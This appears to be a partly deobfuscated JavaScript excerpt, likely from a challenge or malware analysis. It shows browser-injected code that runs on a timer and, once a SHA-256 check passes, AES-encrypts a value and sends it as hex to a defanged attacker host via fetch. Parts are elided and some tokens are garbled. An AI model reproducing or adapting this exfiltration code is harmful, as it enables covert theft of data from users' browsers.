if (!(injected in document)) {
    ...
    window[setInterval](async () => {
      ...
      if (new window[TextDecoder](utf-8)[decode](await window[crypto][subtle][digest](sha-256, y))[endsWith](chrome)) {
        ...
        window[fetch](hxxps://qwertzuiop123.evil/[...new window[Uint8Array](await window[crypto][subtle][encrypt]({[nq[1e3]ame]: AES-CBC, [iv]: new window[TextEncoder](utf-8)[encode](_NOT_THE_SECRET_)}, await window[crypto][subtle][importKey](raw, await window[crypto][subtle][decrypt]({[nq[1e3]ame]: AES-CBC, [iv]: new window[TextEncoder](utf-8)[encode](_NOT_THE_SECRET_)}, await window[crypto][subtle][importKey](raw, new window[TextEncoder](utf-8)[encode](_NOT_THE_SECRET_), {[nq[1e3]ame]: AES-CBC}, true, [decrypt]), new window[Uint8Array]((E242E64261D21969F65BEDF954900A995209099FB6C3C682C0D9C4B275B1C212BC188E0882B6BE72C749211241187FA8)[match](/../g)[map](h => window[parseInt](h, 16)))), {[nq[1e3]ame]: AES-CBC}, true, [encrypt]), j))][map](x => x[toString](16)[padStart](2, "0"))[join](""));
      }
    }, 1);
  }
